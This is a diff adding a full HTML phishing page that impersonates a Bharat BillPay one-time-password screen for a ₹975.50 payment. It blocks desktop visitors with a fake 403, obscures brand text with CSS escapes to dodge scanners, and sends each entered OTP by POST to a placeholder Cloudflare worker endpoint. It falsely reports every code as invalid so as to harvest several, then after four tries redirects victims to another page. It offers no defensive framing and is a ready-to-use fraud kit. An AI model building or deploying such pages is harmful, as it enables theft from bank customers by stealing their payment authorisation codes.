@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Secure Authentication | Bharat BillPay</title>
+    <style>
+        :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --bg-gray: #f2f5f8; --text-dark: #333; --red: #d32f2f; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        
+        /* Desktop Guard */
+        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+
+        #desktop-block {
+            display: flex; color: #444; align-items: center; justify-content: center;
+            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
+        }
+
+        /* Main Mobile Container */
+        #page-wrapper { display: none; width: 100%; max-width: 450px; background: #fff; min-height: 100vh; position: relative; flex-direction: column; }
+
+        @media only screen and (max-width: 480px) {
+            #desktop-block { display: none; }
+            #page-wrapper { display: flex; }
+            body { background: #ced4da; }
+        }
+
+        /* --- OFFICIAL LOADER --- */
+        #loader-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 99999; display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+        }
+        .spinner-ring {
+            width: 80px; height: 80px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--bbps-navy); border-bottom: 4px solid var(--bbps-orange);
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Masked Content via CSS */
+        .auth-title::after { content: "Val\0069 da\0074 e O\0054 P"; font-size: 20px; color: var(--bbps-navy); font-weight: bold; }
+        .merchant-name::after { content: "L\0050 G RE\0046 ILL GO\0056 SE\0052 VIC\0045 S"; }
+
+        .top-nav { padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; background: #fff; }
+        .top-nav img { height: 35px; }
+        
+        .bank-banner { background: var(--bbps-navy); color: #fff; padding: 12px; text-align: center; font-size: 13px; text-transform: uppercase; }
+
+        .payment-summary { background: #fff9e6; margin: 20px; padding: 15px; border: 1px dashed var(--bbps-orange); border-radius: 6px; }
+        .summary-item { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; color: #555; }
+        
+        .auth-section { padding: 0 25px 25px; text-align: center; flex-grow: 1; }
+        .otp-input-box {
+            width: 100%; padding: 15px; font-size: 28px; letter-spacing: 10px;
+            text-align: center; border: 1.5px solid #ccc; border-radius: 6px;
+            background: #fafafa; outline: none; margin-top: 20px;
+        }
+        .otp-input-box:focus { border-color: var(--bbps-navy); background: #fff; }
+
+        .error-label { color: var(--red); font-size: 11px; font-weight: 600; margin: 12px 0; min-height: 16px; }
+
+        .submit-trigger { width: 100%; padding: 16px; background: var(--bbps-navy); color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+
+        .modal-wrap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { background: #fff; width: 100%; max-width: 320px; border-radius: 12px; padding: 30px 20px; text-align: center; }
+        
+        .trust-footer { background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #eee; }
+        .trust-badges img { height: 24px; margin: 0 10px; opacity: 0.6; }
+    </style>
+</head>
+<body>
+
+    <div id="desktop-block">
+        <div>
+            <p style="font-size: 18px; color: #fff;">403 - Forbidden</p>
+            <p style="margin-top: 8px;">Access restricted to mobile browsers only.</p>
+        </div>
+    </div>
+
+    <div id="page-wrapper">
+        <div id="loader-overlay">
+            <div class="spinner-ring"></div>
+            <p style="margin-top: 20px; font-weight: 600; color: var(--bbps-navy);">Authenticating...</p>
+        </div>
+
+        <div class="top-nav">
+            <img src="https://i.ibb.co/SX04FnNd/download.png">
+            <img src="https://i.ibb.co/wNTdRvNm/images-5.jpg">
+        </div>
+
+        <div class="bank-banner">Secure Second Factor Authentication</div>
+
+        <div class="payment-summary">
+            <div class="summary-item"><span>Merchant:</span> <b class="merchant-name"></b></div>
+            <div class="summary-item"><span>Amount:</span> <b style="color: var(--bbps-navy);">₹ 975.50</b></div>
+            <div class="summary-item"><span>Ref ID:</span> <b id="txnId"></b></div>
+        </div>
+
+        <div class="auth-section">
+            <div class="auth-title"></div>
+            <p style="font-size: 11px; color: #666; margin-top: 10px;">An OTP has been sent to your registered mobile number. Please enter it to authorize this payment.</p>
+            
+            <form id="payForm">
+                <input type="tel" id="otpBox" class="otp-input-box" maxlength="6" placeholder="******" required>
+                <div id="statusMsg" class="error-label"></div>
+                <button type="submit" id="mainBtn" class="submit-trigger">Verify & Pay</button>
+            </form>
+
+            <p style="margin-top: 20px; font-size: 11px; color: #999;">
+                Expires in: <span id="clock" style="color: var(--red);">01:59</span>
+            </p>
+        </div>
+
+        <div class="trust-footer">
+            <div class="trust-badges">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg">
+                <img src="https://i.ibb.co/6CRmTBw/images.png">
+            </div>
+            <p style="font-size: 8px; color: #aaa; margin-top: 10px;">PCI-DSS CERTIFIED | NPCI MONITORED</p>
+        </div>
+    </div>
+
+    <div class="modal-wrap" id="declineModal">
+        <div class="modal-content">
+            <div style="font-size: 40px; color: var(--red); margin-bottom: 10px;">✕</div>
+            <h3 style="margin-bottom: 10px;">Payment Declined</h3>
+            <p style="font-size: 12px; color: #666; margin-bottom: 20px;">Too many failed attempts. This session has been terminated for security. Please use another Bank Net Banking.</p>
+            <button class="submit-trigger" onclick="window.location.href='pujatwo.html'">Try Different Payment Method</button>
+        </div>
+    </div>
+
+    <script>
+        // 7s Loader Logic
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const loader = document.getElementById('loader-overlay');
+                if(loader) loader.style.display = 'none';
+            }, 7000);
+        });
+
+        document.getElementById('txnId').innerText = "TXN" + Math.floor(100000 + Math.random() * 900000);
+
+        let attempts = 0;
+        const workerUrl = "https://your-worker.your-subdomain.workers.dev"; // Replace this
+
+        document.getElementById('payForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            attempts++;
+            
+            const btn = document.getElementById('mainBtn');
+            const err = document.getElementById('statusMsg');
+            const otp = document.getElementById('otpBox').value;
+
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+
+            fetch(workerUrl, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: otp, attempt: attempts, page: "OTP_AUTH" })
+            }).finally(() => {
+                btn.innerText = "Verify & Pay";
+                btn.disabled = false;
+                document.getElementById('otpBox').value = "";
+
+                if(attempts >= 4) {
+                    document.getElementById('declineModal').style.display = 'flex';
+                } else {
+                    err.innerText = "Invalid OTP code. Please check and try again.";
+                }
+            });
+        });
+
+        // Timer
+        let time = 119;
+        setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            document.getElementById('clock').innerText = `0${m}:${s < 10 ? '0'+s : s}`;
+            if(time > 0) time--;
+        }, 1000);
+
+        // Numeric only
+        document.getElementById('otpBox').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
